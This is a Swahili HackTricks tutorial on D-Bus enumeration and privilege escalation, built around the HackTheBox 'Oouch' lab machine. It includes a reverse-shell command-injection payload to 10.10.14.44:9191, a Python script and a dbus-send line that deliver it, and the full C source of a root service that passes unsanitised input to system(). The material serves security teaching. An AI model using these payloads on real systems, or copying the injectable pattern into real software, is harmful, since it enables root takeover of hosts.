# Uchambuzi wa D-Bus & Upelelezi wa Amri na Upelekezaji wa Amri

{% hint style="success" %}
Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## **Uchambuzi wa GUI**

D-Bus hutumiwa kama mpatanishi wa mawasiliano kati ya michakato (IPC) katika mazingira ya desktop ya Ubuntu. Kwenye Ubuntu, operesheni za wakati mmoja za mabasi kadhaa ya ujumbe zinaonekana: basi la mfumo, linalotumiwa hasa na **huduma zenye mamlaka kufunua huduma zinazofaa kote kwenye mfumo**, na basi la kikao kwa kila mtumiaji aliyeingia, linalofunua huduma zinazofaa tu kwa mtumiaji huyo maalum. Kuzingatia hapa ni hasa kwenye basi la mfumo kutokana na uhusiano wake na huduma zinazoendeshwa kwa mamlaka ya juu (k.m., root) kwa sababu lengo letu ni kukuza mamlaka. Inabainika kuwa usanifu wa D-Bus unatumia 'router' kwa kila basi la kikao, ambayo inahusika na kupelekeza ujumbe wa mteja kwenye huduma sahihi kulingana na anwani iliyotajwa na wateja kwa huduma wanayotaka kuwasiliana nayo.

Huduma kwenye D-Bus zinatambuliwa na **vitu** na **interfaces** wanazofunua. Vitu vinaweza kulinganishwa na mifano ya darasa katika lugha za OOP za kawaida, kila mifano ikitambuliwa kwa kipekee na **njia ya kitu**. Njia hii, kama njia ya mfumo wa faili, inatambua kila kitu kinachofunuliwa na huduma. Kiolesura muhimu kwa madhumuni ya utafiti ni **org.freedesktop.DBus.Introspectable** interface, ikionyesha njia moja, Introspect. Njia hii inarudisha uwakilishi wa XML wa njia zinazoungwa mkono na kitu, ishara, na mali, na kuzingatia hapa kwenye njia wakati wa kupuuza mali na ishara.

Kwa mawasiliano na kiolesura cha D-Bus, zana mbili zilitumiwa: zana ya CLI inayoitwa **gdbus** kwa wito rahisi wa njia zinazofunuliwa na D-Bus katika hati za maandishi, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), zana ya GUI iliyoandikwa kwa Python iliyoundwa kuchambua huduma zinazopatikana kwenye kila basi na kuonyesha vitu vilivyomo ndani ya kila huduma.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Katika picha ya kwanza huduma zilizosajiliwa na basi la mfumo la D-Bus zinaonyeshwa, na **org.debin.apt** ikisisitizwa hasa baada ya kuchagua kitufe cha Basi la Mfumo. D-Feet inauliza huduma hii kwa vitu, ikionyesha viunganishi, njia, mali, na ishara kwa vitu vilivyochaguliwa, vinavyoonekana katika picha ya pili. Saini ya kila njia pia imeelezewa.

Kipengele kinachoweza kuzingatiwa ni kuonyesha **kitambulisho cha mchakato (pid)** na **mstari wa amri**, muhimu kwa kuthibitisha ikiwa huduma inaendeshwa na mamlaka ya juu, muhimu kwa uhusiano wa utafiti.

**D-Feet pia inaruhusu wito wa njia**: watumiaji wanaweza kuingiza maneno ya Python kama parameta, ambayo D-Feet inabadilisha kuwa aina za D-Bus kabla ya kuzipitisha kwa huduma.

Hata hivyo, kumbuka kwamba **baadhi ya njia zinahitaji uthibitisho** kabla ya kuturuhusu kuziita. Tutapuuza njia hizi, kwani lengo letu ni kuboresha haki zetu bila vibali kwanza.

Pia eleza kwamba baadhi ya huduma huzululiza huduma nyingine ya D-Bus inayoitwa org.freedeskto.PolicyKit1 ikiwa mtumiaji anapaswa kuruhusiwa kufanya vitendo fulani au la.

## **Uorodheshaji wa Amri za Cmd**

### Orodhesha Vitu vya Huduma

Inawezekana kuorodhesha viunganishi vilivyofunguliwa vya D-Bus na:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Uunganisho

[Kutoka kwa wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati mchakato unapoweka uhusiano na basi, basi humpa uhusiano jina maalum la basi linaloitwa _jina la kipekee la uhusiano_. Majina ya basi ya aina hii hayawezi kubadilishwa - inahakikishiwa kuwa hayatabadilika muda mrefu uhusiano upo - na, zaidi ya yote, haviwezi kutumika tena wakati wa maisha ya basi. Hii inamaanisha kuwa hakuna uhusiano mwingine kwenye basi hilo ambao utapewa jina la kipekee la uhusiano, hata kama mchakato huo huo unafunga uhusiano na basi na kuunda mpya. Majina ya kipekee ya uhusiano ni rahisi kutambulika kwa sababu huanza na herufi ya—ambayo kwa kawaida ni marufuku—ya mkato. 

### Taarifa ya Kitu cha Huduma

Kisha, unaweza kupata habari fulani kuhusu kiolesura na:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Orodhesha Interface za Kitu cha Huduma

Unahitaji kuwa na ruhusa za kutosha.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Angalia Kiolesura cha Kitu cha Huduma

Tazama jinsi katika mfano huu ilivyochaguliwa kiolesura cha hivi karibuni kilichogunduliwa kwa kutumia parameter ya `tree` (_angalia sehemu iliyopita_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### Kufuatilia/ Kukamata Kiolesura

Ukiwa na mamlaka za kutosha (mamlaka ya `send_destination` na `receive_sender` pekee sio za kutosha) unaweza **kufuatilia mawasiliano ya D-Bus**.

Ili **kufuatilia** **mawasiliano** utahitaji kuwa **root**. Ikiwa bado unaona matatizo kuwa root angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Ikiwa unajua jinsi ya configure faili ya usanidi ya D-Bus ili **kuruhusu watumiaji wasio na mamlaka ya kuchunguza** mawasiliano tafadhali **wasiliana nami**!
{% endhint %}

Njia tofauti za kufuatilia:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Katika mfano ufuatao kiolesura `htb.oouch.Block` kinachunguzwa na **ujumbe "**_**lalalalal**_**" hutumwa kupitia mawasiliano mabaya**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
#### Kuchuja kelele zote <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ikiwa kuna habari nyingi sana kwenye basi, pitisha sheria ya kupatana kama ifuatavyo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Tazama [nyaraka ya D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya sheria za mechi.

### Zaidi

`busctl` ina chaguo zaidi, [**pata yote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Hali ya Kudhoofika**

Kama mtumiaji **qtc ndani ya mwenyeji "oouch" kutoka HTB** unaweza kupata **faili ya usanidi ya D-Bus isiyotarajiwa** iliyoko _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Tafadhali kumbuka kutoka kwenye mazingira ya awali kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea habari** kupitia mawasiliano ya D-BUS haya.

Kama mtumiaji **qtc** ndani ya kontena la docker **aeb4525789d8** unaweza kupata nambari fulani inayohusiana na dbus kwenye faili _/code/oouch/routes.py._ Hii ndio nambari inayovutia:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kama unavyoona, ni **kuunganisha kwa kiolesura cha D-Bus** na kutuma kwa **kazi ya "Block"** "client\_ip".

Upande mwingine wa uhusiano wa D-Bus kuna faili iliyoundwa kwa C inayotumika. Msimbo huu unakuwa **ukisikiliza** kwenye uhusiano wa D-Bus **kwa anwani ya IP na kuita iptables kupitia kazi ya `system`** kuzuia anwani ya IP iliyotolewa.\
**Wito wa `system` una kasoro kwa makusudi ya kuingiza amri**, hivyo mzigo kama huu utaunda kabati la kurudi: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Tumia mwanya huo

Mwishoni mwa ukurasa huu unaweza kupata **mimbo kamili ya C ya programu ya D-Bus**. Ndani yake unaweza kupata kati ya mistari 91-97 **jinsi `njia ya kitu cha D-Bus`** **na `jina la kiolesura`** vinavyo **sajiliwa**. Taarifa hii itakuwa muhimu kutuma taarifa kwa uhusiano wa D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Pia, kwenye mstari wa 57 unaweza kupata kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo sababu katika sehemu inayofuata mizigo itatumwa kwa kitu cha huduma `htb.oouch.Block`, kiolesura `/htb/oouch/Block` na jina la njia `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Msimbo wa python ufuatao utatuma mzigo kwenye uunganisho wa D-Bus kwa njia ya `Block` kupitia `block_iface.Block(runme)` (_kumbuka kwamba ulichimbuliwa kutoka kipande cha msimbo kilichotangulia_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl na dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` ni chombo kinachotumika kutuma ujumbe kwa "Message Bus"
* Message Bus - Programu inayotumiwa na mifumo kufanya mawasiliano kati ya maombi kwa urahisi. Inahusiana na Message Queue (ujumbe huwa katika mpangilio) lakini kwenye Message Bus ujumbe hutumwa kwa mfano wa usajili na pia haraka sana.
* Lebo ya "-system" hutumiwa kutaja kuwa ni ujumbe wa mfumo, si ujumbe wa kikao (kwa chaguo-msingi).
* Lebo ya "--print-reply" hutumiwa kuchapisha ujumbe wetu ipasavyo na kupokea majibu yoyote kwa muundo wa kibinadamu.
* "--dest=Dbus-Interface-Block" Anwani ya kiolesura cha Dbus.
* "--string:" - Aina ya ujumbe tunayotaka kutuma kwa kiolesura. Kuna miundo kadhaa ya kutuma ujumbe kama vile double, bytes, booleans, int, objpath. Kati ya hizi, "njia ya kitu" ni muhimu tunapotaka kutuma njia ya faili kwa kiolesura cha Dbus. Tunaweza kutumia faili maalum (FIFO) katika kesi hii kupitisha amri kwa kiolesura kwa jina la faili. "string:;" - Hii ni kuita njia ya kitu tena ambapo tunaweka faili ya shell ya FIFO/amri.

_Tafadhali kumbuka kwamba katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inahusiana na kitu cha huduma na sehemu ya mwisho (`.Block`) inahusiana na jina la njia._

### Msimbo wa C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Marejeo
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
